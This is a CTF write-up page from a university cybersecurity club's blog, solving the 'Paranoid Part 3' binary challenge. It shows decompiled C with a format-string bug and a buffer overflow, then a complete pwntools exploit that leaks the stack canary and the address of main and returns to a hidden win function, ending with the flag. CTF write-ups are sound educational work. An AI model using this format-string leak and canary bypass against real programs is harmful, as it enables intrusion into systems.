@@ -1,0 +1,75 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Paranoid Part 3</title><meta content="Paranoid Part 3" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/paranoid3/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Paranoid Part 3" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/paranoid3/ property=twitter:url><meta content="Paranoid Part 3" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/paranoid3/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>paranoid3</span></div><time datetime=2024-07-04>Published on: <span class=accent-data>2024-07-04</span></time><address rel=author>By <span class=accent-data> Abhinav I S, and exploiitm </span></address><h1>Paranoid Part 3</h1><p>First, we run checksec <br><div class=textCenter><img alt="Alt Text" src=image1.png></div><br><pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>void </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> in_FS_OFFSET;
+</span><span>  </span><span style=color:#fa5c4b>char</span><span> local_68 [</span><span style=color:#d3869b>48</span><span>];
+</span><span>  undefined local_38 [</span><span style=color:#d3869b>40</span><span>];
+</span><span>  </span><span style=color:#fa5c4b>long</span><span> local_10;
+</span><span>  
+</span><span>  local_10 </span><span style=color:#fe8019>= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>);
+</span><span>  </span><span style=color:#fdf4c1>banner()</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nOkay Its getting serious now. Somehow I now suck at hiding my actual address."</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nHence, I\'ve now decided to keep one of the strongest security guard on watch"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nHe will make sure that no one gets in and collects any evidence against me"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nHe\'s no ordinary guard I tell ya...The FBI fear him!"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nCan you guess who he is?: "</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
+</span><span>  </span><span style=color:#fdf4c1>read(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,local_68,</span><span style=color:#d3869b>0x23</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nReally? you couldn\'t think of anyone better than "</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(local_68)</span><span>;
+</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"\nTill we meet again then my old friend...Give me your final message. You will likely not s ee me now for a long time: "
+</span><span style=color:#fdf4c1>        )</span><span>;
+</span><span>  </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
+</span><span>  </span><span style=color:#fdf4c1>read(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,local_38,</span><span style=color:#d3869b>0x120</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>  </span><span style=color:#fa5c4b>if </span><span>(local_10 </span><span style=color:#fe8019>!= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>)) {
+</span><span>                    </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
+</span><span>    </span><span style=color:#fdf4c1>__stack_chk_fail()</span><span>;
+</span><span>  }
+</span><span>  </span><span style=color:#fa5c4b>return</span><span>;
+</span><span>}
+</span></code></pre><p>looking at the other functions, there is a safe_house function which we need to return to. The difference from paranoid part 2 is the existence of <a href=https://ctf101.org/binary-exploitation/stack-canaries/ rel=noopener target=_blank>a stack canary</a><p>opening the binary in GDB, examining addresses of RBP, and the value that gets printed from the stack, we can calculate the offset to the canary, and the address of main<ol><li>give input %7$lx, the value that gets printed out is 0<li>examine stack and value of rbp</ol><br><div class=textCenter><img alt="Alt Text" src=image2.png></div><ol start=3><li>clearly the canary is at %17$lx and the address of main is at %21$lx</ol><p>Now, we can write the solve script<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/usr/bin/env python3
+</span><span>
+</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span>exe </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ELF(</span><span style=color:#b8bb26>"./challenge"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>context.binary </span><span style=color:#fe8019>= </span><span>exe
+</span><span>context.log_level </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"debug"
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>conn</span><span>():
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>LOCAL</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process([exe.path])
+</span><span>        </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>DEBUG</span><span>:
+</span><span>            </span><span style=color:#fdf4c1>gdb.attach(r)
+</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"rvcechalls.xyz"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>33545</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>r
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>main</span><span>():
+</span><span>    r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>conn()  
+</span><span>    </span><span style=color:#fdf4c1>r.recv()
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"%17$lx.%21$lx"</span><span style=color:#fdf4c1>)
+</span><span>    data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>r.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"better than "</span><span style=color:#fdf4c1>)
+</span><span>    data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>r.recv()
+</span><span>    addresses </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>data.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\n"</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>0</span><span>]
+</span><span>
+</span><span>    canary </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>addresses.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"."</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>0</span><span>]
+</span><span>    main </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>addresses.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"."</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>1</span><span>]
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#928374># r.recv()
+</span><span>    win </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(main,</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>- </span><span style=color:#d3869b>211
+</span><span>    payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"A"</span><span style=color:#fe8019>*</span><span style=color:#d3869b>0x28 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(canary,</span><span style=color:#d3869b>16 </span><span style=color:#fdf4c1>))</span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"B"</span><span style=color:#fe8019>*</span><span style=color:#d3869b>8 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(win)
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(payload)
+</span><span>    </span><span style=color:#fdf4c1>r.recv()
+</span><span>    </span><span style=font-style:italic;color:#928374># good luck pwning :)
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>r.interactive()
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"__main__"</span><span>:
+</span><span>    </span><span style=color:#fdf4c1>main()
+</span></code></pre><p>gives us the flag <br><pre style=background:#282828;color:#fdf4c1aa><code><span>flag{Th15_pUnY_6u4rd_aint_S70pp1n_m33_1907ebe25bf}
+</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
